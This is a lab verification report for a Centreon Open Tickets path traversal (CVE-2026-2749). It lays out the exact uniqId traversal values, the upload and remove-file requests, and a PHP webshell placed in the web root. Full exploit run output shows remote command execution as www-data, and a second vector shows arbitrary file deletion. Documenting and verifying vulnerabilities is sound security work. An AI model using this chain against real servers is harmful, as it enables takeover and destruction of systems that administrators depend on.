# PoC Verification Report: CVE-2026-2749

## CVE Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2026-2749 |
| **Vulnerability** | Path Traversal in Centreon Open Tickets File Upload/Remove Actions |
| **CVSS** | 9.9 Critical |
| **Verification Status** | **CONFIRMED** |

---

## PoC Scripts

### Primary PoC: Arbitrary File Write → RCE (`poc.py`)

| Field | Value |
|-------|-------|
| **Location** | `poc/poc.py` |
| **Language** | Python 3 (stdlib only — no external dependencies) |
| **Attack Vector** | Path traversal via `uniqId` parameter → webshell upload → RCE |
| **Result** | **CONFIRMED** — Full RCE achieved |

**Description**: Exploits the `uploadFile.php` action by injecting `../../` sequences into the `uniqId` query parameter. The vulnerable code concatenates this unsanitized value into the file destination path:
```php
$file_dst = $dir . '/opentickets/' . $uniq_id . '__' . $file['name'];
```
With `uniqId=../../var/www/html/centreon/pwned`, the file is written to `/var/www/html/centreon/pwned__shell.php`, placing a PHP webshell in the web root. The PoC then executes commands via the webshell and cleans up.

**Steps**:
1. Authenticates via mock login (POST `/centreon/login.php`) to obtain `PHPSESSID`
2. Uploads PHP webshell with traversal `uniqId=../../var/www/html/centreon/pwned`
3. Executes `id`, `whoami`, `uname -a`, `cat /etc/hostname` via the webshell
4. Cleans up by deleting the webshell via the `remove-file` action

---

### Vector 2: Arbitrary File Deletion (`poc_vector2.py`)

| Field | Value |
|-------|-------|
| **Location** | `poc/poc_vector2.py` |
| **Language** | Python 3 (stdlib only) |
| **Attack Vector** | Path traversal via `uniqId` in `removeFile.php` → arbitrary file deletion |
| **Result** | **CONFIRMED** — Arbitrary file deletion achieved |

**Description**: Exploits the `removeFile.php` action by injecting `../../` sequences into the `uniqId` parameter of the JSON body. The vulnerable code calls:
```php
unlink($temp_dir . '/opentickets/' . $get_information['uniqId'] . '__' . $get_information['filename']);
```
This PoC creates a canary file outside `/tmp/opentickets/` (via the upload traversal), then deletes it via the remove-file traversal, proving arbitrary file deletion. In a real attack, this could target critical files like `/usr/share/centreon/www/index.php` (application DoS) or configuration files.

**Steps**:
1. Authenticates to obtain session cookie
2. Creates canary file at `/tmp/cve_canary__canary.txt` via upload path traversal
3. Deletes the canary via `remove-file` with `uniqId=../../tmp/cve_canary` and `filename=canary.txt`
4. Verifies the file is gone

---

### Vector 3: Filename-based Traversal Test (`poc_vector3.py`)

| Field | Value |
|-------|-------|
| **Location** | `poc/poc_vector3.py` |
| **Language** | Python 3 (stdlib only) |
| **Attack Vector** | Path traversal via `$_FILES['name']` (multipart filename header) |
| **Result** | **NOT EXPLOITABLE** — PHP strips directory components from uploaded filenames |

**Description**: Tests whether the `$file['name']` parameter (from the multipart upload's `Content-Disposition` header) can be used for path traversal independently of `uniqId`. The test sent filenames like `../../../tmp/filename_traversal_proof.txt` in the multipart Content-Disposition header.

**Finding**: PHP's multipart parser strips directory components from `$_FILES['name']`, returning only the basename (`filename_traversal_proof.txt`). The `../../../tmp/` prefix is removed before reaching `uploadFile.php`. Files were written normally inside `/tmp/opentickets/` with the basename only.

**Conclusion**: The filename parameter is NOT independently exploitable. **The `uniqId` parameter is the only viable traversal vector** for both upload and delete operations.

---

## Test Results

### Test 1: Arbitrary File Write → RCE (Primary PoC)

**Command:**
```bash
cd poc && python3 poc.py 172.22.0.3 80
```

**Output:**
```
=================================================================
  CVE-2026-2749: Centreon Open Tickets Path Traversal → RCE
  Target: 172.22.0.3:80
=================================================================

[*] Step 1: Authenticating to Centreon...
  [+] Authenticated successfully
  [+] Session cookie: PHPSESSID=4ef5dcf33f65b2ce1ea2ca16aa01e1d2

[*] Step 2: Uploading webshell via path traversal...
  [*] Traversal uniqId: ../../var/www/html/centreon/pwned
  [*] Upload URL: /centreon/modules/centreon-open-tickets/views/rules/ajax/call.php?action=upload-file&uniqId=..%2F..%2Fvar%2Fwww%2Fhtml%2Fcentreon%2Fpwned
  [*] Upload response (HTTP 200): {'code': 0, 'msg': 'ok'}
  [+] Webshell uploaded to: /var/www/html/centreon/pwned__shell.php
  [+] Accessible at: http://172.22.0.3:80/centreon/pwned__shell.php

[*] Step 3: Executing commands via webshell (proving RCE)...
  [+] $ id
      uid=33(www-data) gid=33(www-data) groups=33(www-data)
  [+] $ whoami
      www-data
  [+] $ uname -a
      Linux f00ab20d284e 6.12.68-linuxkit #1 SMP Mon Feb  2 10:12:50 UTC 2026 aarch64 GNU/Linux
  [+] $ cat /etc/hostname
      f00ab20d284e

  ╔══════════════════════════════════════════════════════════╗
  ║  RCE CONFIRMED — CVE-2026-2749 successfully exploited   ║
  ╚══════════════════════════════════════════════════════════╝

[*] Step 4: Cleaning up webshell...
  [+] Cleanup request sent (HTTP 200)
  [+] Webshell successfully removed

[+] EXPLOIT SUCCESSFUL — CVE-2026-2749 confirmed
```

**Verification Status: CONFIRMED** ✅

---

### Test 2: Arbitrary File Deletion (Vector 2)

**Command:**
```bash
python3 poc_vector2.py 172.22.0.3 80
```

**Output:**
```
=================================================================
  CVE-2026-2749 Vector 2: Arbitrary File Deletion
  Target: 172.22.0.3:80
=================================================================

[*] Authenticating...
  [+] Authenticated: PHPSESSID=55edfa22547ae0df8976209d485e2b15

[*] Creating canary file via upload path traversal...
  [*] Upload response: HTTP 200 — {'code': 0, 'msg': 'ok'}
  [+] Canary file created at: /tmp/cve_canary__canary.txt

[*] Canary file should now exist at /tmp/cve_canary__canary.txt

[*] Deleting canary file via remove-file path traversal...
  [*] Delete response: HTTP 200 — {'code': 0, 'msg': 'ok'}
  [+] Delete request sent successfully

[*] Canary file should now be DELETED from /tmp/cve_canary__canary.txt

  ╔══════════════════════════════════════════════════════════════╗
  ║  ARBITRARY FILE DELETION DEMONSTRATED — CVE-2026-2749       ║
  ╚══════════════════════════════════════════════════════════════╝
```

**Docker Verification:**
```bash
$ docker exec cve-2026-2749-vulnerable ls -la /tmp/cve_canary__canary.txt
ls: cannot access '/tmp/cve_canary__canary.txt': No such file or directory
PASS: File does not exist (deleted via path traversal)
```

**Verification Status: CONFIRMED** ✅

---

### Test 3: Filename-based Traversal (Vector 3)

**Command:**
```bash
python3 poc_vector3.py 172.22.0.3 80
```

**Output:**
```
=================================================================
  CVE-2026-2749 Vector 3: Filename-based Traversal Test
  Target: 172.22.0.3:80
=================================================================

[*] Authenticating...
  [+] Authenticated: PHPSESSID=72c7f79ef6c0f567c645f0ae241f5540

[*] Testing filename-based path traversal...
  [*] uniqId: abcdef1234567
  [*] filename: ../../../tmp/filename_traversal_proof.txt
  [*] Response: HTTP 200 — {'code': 0, 'msg': 'ok'}
  [+] Server returned success — filename traversal may have worked

[*] Testing alternative filename traversal (relative, shallower)...
  [*] Response: HTTP 200 — {'code': 0, 'msg': 'ok'}
  [+] Server returned success — checking location

=================================================================
  RESULTS SUMMARY
=================================================================
  Deep traversal (filename=../../../tmp/...): success_response
  Shallow traversal (filename=../...): success_response
```

**Docker Verification:**
```bash
$ docker exec cve-2026-2749-vulnerable ls -la /tmp/filename_traversal_proof.txt
ls: cannot access '/tmp/filename_traversal_proof.txt': No such file or directory

$ docker exec cve-2026-2749-vulnerable ls -la /tmp/opentickets/
abcdef1234567__filename_traversal_proof.txt    # basename only — traversal stripped
abcdef1234567__fntest_proof.txt                # basename only — traversal stripped
```

**Result**: PHP's `$_FILES` multipart parser strips directory components from the `filename` field in the Content-Disposition header. The `../` sequences are removed, leaving only the basename. Files were written to `/tmp/opentickets/` with normal names.

**Verification Status: NOT EXPLOITABLE** (filename parameter is sanitized by PHP itself)

---

## Vulnerability Demonstrated

| Attack Vector | Status | Impact |
|--------------|--------|--------|
| Arbitrary File Write via `uniqId` traversal | **CONFIRMED** ✅ | Write files anywhere on disk (as `www-data`) |
| Remote Code Execution via webshell upload | **CONFIRMED** ✅ | Full server compromise (command execution as `www-data`) |
| Arbitrary File Deletion via `uniqId` traversal | **CONFIRMED** ✅ | Delete any file accessible to `www-data` (DoS, data loss) |
| Filename-based traversal (`$_FILES['name']`) | **NOT EXPLOITABLE** ❌ | PHP strips directory components from uploaded filenames |

---

## Key Technical Findings

### 1. Traversal Vector: `uniqId` Parameter Only
The path traversal is exploitable **only through the `uniqId` parameter**, not the uploaded filename. PHP's multipart parser automatically strips directory components from `$_FILES['name']`, effectively performing `basename()` before the application code runs. This means only the `$_REQUEST['uniqId']` parameter provides the traversal path.

### 2. File Naming Constraint
The resulting filename always contains the `__` separator:
- `/var/www/html/centreon/pwned__shell.php` (from `uniqId=../../var/www/html/centreon/pwned` + `filename=shell.php`)
- The `__` prefix is cosmetic — the file is still valid PHP and accessible via HTTP

### 3. Authentication Requirement
The exploit requires a valid PHP session with `$_SESSION['centreon']` set. Any authenticated Centreon user (including low-privilege accounts) can exploit this. The session is established via the standard Centreon login form.

### 4. Cleanup via Same Vulnerability
The same path traversal in `removeFile.php` can be used to clean up the webshell after exploitation, demonstrating both write and delete primitives.

### 5. `rename()` vs `move_uploaded_file()`
The vulnerable code uses `rename()` instead of `move_uploaded_file()`. While `rename()` doesn't verify the source is a genuine PHP upload (reducing a layer of defense), the path traversal itself is the critical issue — both functions would follow the traversal path.

---

## Exploit Requirements

| Requirement | Value |
|------------|-------|
| **Authentication** | Valid Centreon session (any user, including low-privilege) |
| **Network Access** | HTTP access to Centreon web interface |
| **Privileges** | Low (any authenticated user — `PR:L` in CVSS) |
| **User Interaction** | None required |
| **Dependencies** | Python 3 standard library only |

---

## Files

```
poc/
├── poc.py           # Primary: Arbitrary File Write → RCE (CONFIRMED)
├── poc_vector2.py   # Vector 2: Arbitrary File Deletion (CONFIRMED)
└── poc_vector3.py   # Vector 3: Filename traversal test (NOT EXPLOITABLE)
```

---

## Verification Status: CONFIRMED

CVE-2026-2749 has been successfully exploited in the lab environment. The primary PoC (`poc.py`) demonstrates the full attack chain from authenticated path traversal to Remote Code Execution, and the secondary PoC (`poc_vector2.py`) demonstrates arbitrary file deletion. Both attack vectors are fully functional and independently verified.
